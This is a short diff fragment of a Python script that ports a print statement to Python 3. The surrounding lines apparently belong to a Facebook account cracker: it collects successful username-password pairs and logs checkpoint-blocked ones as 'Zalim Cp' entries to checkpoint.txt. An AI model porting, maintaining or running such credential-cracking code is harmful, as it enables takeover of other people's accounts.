@@ -507,7 +507,7 @@ def choice_action():
 								oks.append(user+pass3)
 							else:
 								if "www.facebook.com" in q3["error_msg"]:
-									print "[Zalim Cp] " + user + " | " + pass3
+									print ("[Zalim Cp] " + user + " | " + pass3)
 									cps = open("checkpoint.txt", "a")
 									cps.write(user+"|"+pass3+"\n")
 									cps.close()
